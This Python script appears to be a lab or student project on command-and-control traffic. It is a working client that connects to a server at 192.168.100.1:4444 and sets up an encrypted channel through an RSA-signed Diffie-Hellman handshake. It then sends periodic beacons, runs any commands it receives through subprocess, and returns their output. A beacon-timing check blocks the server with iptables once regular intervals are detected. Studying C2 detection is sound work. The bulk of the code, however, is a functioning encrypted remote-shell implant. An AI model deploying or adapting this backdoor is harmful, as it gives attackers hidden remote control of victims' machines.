import socket
import time
import subprocess
import os
import base64

from cryptography.hazmat.primitives.asymmetric import padding, dh
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.fernet import Fernet

HOST = "192.168.100.1"
PORT = 4444

# ================= LOAD SERVER PUBLIC KEY =================
with open("server_public.pem", "rb") as f:
    server_rsa_public = serialization.load_pem_public_key(f.read())

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))
client.settimeout(1)

print("[+] Connected to server")

# ================= HANDSHAKE =================
print("[*] Performing secure handshake...")

# ================= RECEIVE DH PUBLIC KEY =================
dh_len = int.from_bytes(client.recv(4), 'big')
dh_bytes = client.recv(dh_len)

# ================= RECEIVE SIGNATURE =================
sig_len = int.from_bytes(client.recv(4), 'big')
signature = client.recv(sig_len)

# ================= VERIFY SIGNATURE =================
try:
    server_rsa_public.verify(
        signature,
        dh_bytes,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    print("[+] RSA verification successful (Trusted Server)")
except Exception:
    print("[❌] RSA verification failed! Possible MITM attack")
    client.close()
    exit()

# ================= LOAD DH =================
server_dh_public = serialization.load_pem_public_key(dh_bytes)

# ================= GENERATE CLIENT DH =================
server_parameters = server_dh_public.parameters()

client_private = server_parameters.generate_private_key()
client_public = client_private.public_key()

client_bytes = client_public.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

client.send(len(client_bytes).to_bytes(4, 'big'))
client.send(client_bytes)

# ================= SHARED KEY =================
shared_key = client_private.exchange(server_dh_public)

# ================= DERIVE AES =================
derived_key = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=None,
    info=b'handshake data'
).derive(shared_key)

fernet_key = base64.urlsafe_b64encode(derived_key)
cipher = Fernet(fernet_key)

print("[+] Secure channel established!")

# ================= DETECTION VARIABLES =================
last_time = None
intervals = []
window_size = 5
alert_triggered = False
blocked = False

def block_ip(ip):
    print(f"\n Blocking C2 Server: {ip}\n")
    os.system(f"sudo iptables -A OUTPUT -d {ip} -j REJECT")
    os.system(f"sudo iptables -A INPUT -s {ip} -j REJECT")

# ================= MAIN LOOP =================
while True:
    try:
        current_time = time.time()

        beacon = "HELLO_FROM_CLIENT"
        client.send(cipher.encrypt(beacon.encode()))

        if last_time is not None:
            interval = current_time - last_time
            intervals.append(interval)

            if len(intervals) > window_size:
                intervals.pop(0)

            print(f"[DEBUG] Interval: {interval:.2f} sec")

            if len(intervals) == window_size:
                avg = sum(intervals) / len(intervals)

                if all(abs(i - avg) < 0.7 for i in intervals):
                    if not alert_triggered:
                        print("\n [ALERT] C2 Beaconing Detected!\n")
                        alert_triggered = True

                        if not blocked:
                            block_ip(HOST)
                            blocked = True
                            client.close()
                            print("[+] Connection terminated after blocking")
                            break
                else:
                    alert_triggered = False

        last_time = current_time

        try:
            data = client.recv(4096)
            if data:
                command = cipher.decrypt(data).decode()
                print("[CMD RECEIVED]:", command)

                if command.lower() == "exit":
                    break

                output = subprocess.getoutput(command)
                client.send(cipher.encrypt(output.encode()))

        except socket.timeout:
            pass

        time.sleep(5)

    except Exception as e:
        print("[ERROR]:", e)
        break

client.close()